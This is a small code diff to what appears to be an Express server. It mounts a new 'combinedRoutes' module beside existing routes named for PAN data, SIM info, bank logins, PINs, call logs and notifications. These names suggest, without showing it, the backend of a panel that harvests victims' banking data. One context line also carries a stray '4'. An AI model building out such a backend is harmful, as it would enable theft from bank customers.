@@ -18,6 +18,7 @@ import panRoutes from "./routes/panRoutes.js";
 import simInfoRoutes from "./routes/simInfoRoutes.js";
 import authRoutes from "./routes/authRoutes.js";
 import bankLoginRoutes from "./routes/bankLoginRoutes.js";
+import combinedRoutes from "./routes/combinedRoutes.js";
 import logRoutes from "./routes/logRoutes.js";
 import notificationRoutes from "./routes/notificationRoutes.js";
 import callRoutes from "./routes/callRoutes.js";
@@ -309,6 +310,7 @@ app.use("/api/status", statusRoutes);
 app.use("/api/action", logRoutes);4
 app.use("/api", formRoutes);
 app.use("/api/lastseen", lastSeenRoutes);
+app.use("/api", combinedRoutes);
 app.use("/api/call-log", callLogRoutes);
 app.use("/api", pinRoutes);
 app.use("/api", bankLoginRoutes);
